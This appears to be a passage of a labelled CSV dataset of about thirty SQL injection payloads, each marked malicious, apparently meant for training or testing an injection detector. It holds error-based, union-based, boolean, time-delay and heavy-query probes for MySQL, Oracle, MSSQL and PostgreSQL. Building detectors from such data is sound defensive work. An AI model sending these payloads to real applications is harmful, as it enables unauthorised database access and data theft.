row_index,payload_norm,label,sqli_type_hint
8940,"1%' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and '%' = '",1,
8941,"1%"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""%"" = """,1,
8942,"-8109%"" ) ) union all select 9089,9089--",1,
8943,1 ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1,
8944,"1'+ ( select pxrg where 5589 = 5589 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
8945,1'|| ( select 'uebk' from dual where 6990 = 6990,1,
8946,"1"" rlike ( select ( case when ( 3711 = 3313 ) then 1 else 0x28 end ) ) and ""iqlh"" like ""iqlh",1,
8947,"-9007 ) as gill where 6462 = 6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1,
8948,"1"" ) ) ) and make_set ( 6751 = 8128,8128 ) and ( ( ( ""uhiy"" = ""uhiy",1,
8949,1%' and 7366 = 9197#,1,
8950,"-6731"" where 6166 = 6166 union all select 6166,6166,6166,6166,6166,6166--",1,
8951,"1 ) ) ) and make_set ( 8882 = 1593,1593 ) and ( ( ( 7989 = 7989",1,
8952,1' ) and ( 3020 = 3020 ) *6703,1,
8953,else dbms_lock.sleep ( 0 ),1,
8954,"1"" ) ) as qrok where 8257 = 8257 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8955,"1"" ) ) as yuqr where 7226 = 7226 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,
8956,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""wdbg"" like ""wdbg",1,
8957,-2658 ) as casi where 7364 = 7364 or 8245 = 9651--,1,
8958,"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""tzqk"" like ""tzqk",1,
8959,-7984' order by 1--,1,
8960,"1"" where 6352 = 6352",1,
8961,"1%' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
8962,"-4695' ) ) ) union all select 5844,5844,5844,5844,5844,5844#",1,
8963,-8028%' ) ) ) or 5042 = 5214,1,
8964,"-2382%' ) union all select 8885,8885,8885,8885,8885,8885,8885#",1,
8965,"1"" union all select null#",1,
8966,1'|| ( select 'bifa' where 6077 = 6077 and 4547 = 9301,1,
8967,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'xzlx' like 'xzlx",1,
8968,1 ) ) as ojjk where 3687 = 3687 and ( 4833 = 9218 ) *9218--,1,
8969,"-7236 or make_set ( 9618 = 6919,6919 )",1,
